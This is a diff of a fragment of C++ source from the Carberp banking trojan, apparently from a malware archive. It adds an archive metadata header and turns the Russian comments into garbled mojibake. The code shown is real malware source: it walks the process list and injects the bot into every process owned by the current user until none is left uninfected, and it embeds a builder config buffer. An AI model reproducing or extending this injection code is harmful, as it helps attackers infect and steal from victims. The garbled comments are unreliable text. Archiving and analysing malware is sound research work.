@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -12,22 +23,22 @@
 #include "..\common\process.h"
 
 /*
-  Перменная в которую билдер сохзраняет базоовые данные для бота.
-  Данная переменная должны находиться в произволбном cpp-файле, для обеспечения рандомизации ее
-  адреса.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
+  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ cpp-пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ
+  пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 extern const char baseConfigSource[sizeof(BASECONFIG)] = {'B', 'A', 'S', 'E', 'C', 'O', 'N', 'F', 'I', 'G'};
 
 /*
-  Инжектирование кода в конкретный процесс.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN pid           - ID процесса.
-  IN processMutex  - мютекс процесса.
-  IN proccessFlags - данные для нового coreData.proccessFlags, текщие данные наследуются по маске
+  IN pid           - ID пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN processMutex  - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN proccessFlags - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ coreData.proccessFlags, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
                      Core::CDPT_INHERITABLE_MASK.
 
-  Return           - true - в случаи успеха,
-                     false - в случаи ошибки.
+  Return           - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+                     false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags)
 {
@@ -97,7 +108,7 @@ bool CoreInject::_injectToAll(void)
 
   WDEBUG0(WDDT_INFO, "Listing processes...");  
 
-  //Ишим процессы до тех пор, пока не остнется не зараженных.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   LPDWORD injectedPids    = NULL;
   DWORD injectedPidsCount = 0;
   DWORD newProcesses;
@@ -120,13 +131,13 @@ bool CoreInject::_injectToAll(void)
           DWORD sessionId;
           DWORD sidLength;
 
-          //Проверям сушетвует ли ID уже в списке.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ ID пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
           for(DWORD i = 0; i < injectedPidsCount; i++)if(injectedPids[i] == pe.th32ProcessID)goto SKIP_INJECT;
 
           HANDLE mutexOfProcess = Core::createMutexOfProcess(pe.th32ProcessID);
           if(mutexOfProcess == NULL)goto SKIP_INJECT;
 
-          //Получаем SID процесса и сравниваем его с SID текшего процесса.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ SID пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ SID пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
           if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)
           {
             //WDEBUG2(WDDT_INFO, "sessionId=\"%u\", coreData.currentUser.id=\"%u\"", sessionId, coreData.currentUser.id);
@@ -134,7 +145,7 @@ bool CoreInject::_injectToAll(void)
                (sidLength = CWA(advapi32, GetLengthSid)(tu->User.Sid)) == coreData.currentUser.sidLength &&
                Mem::_compare(tu->User.Sid, coreData.currentUser.token->User.Sid, sidLength) == 0)
             {
-              //SID'ы равны.
+              //SID'пїЅ пїЅпїЅпїЅпїЅпїЅ.
               if(Mem::reallocEx(&injectedPids, (injectedPidsCount + 1) * sizeof(DWORD)))
               {
                 injectedPids[injectedPidsCount++] = pe.th32ProcessID;
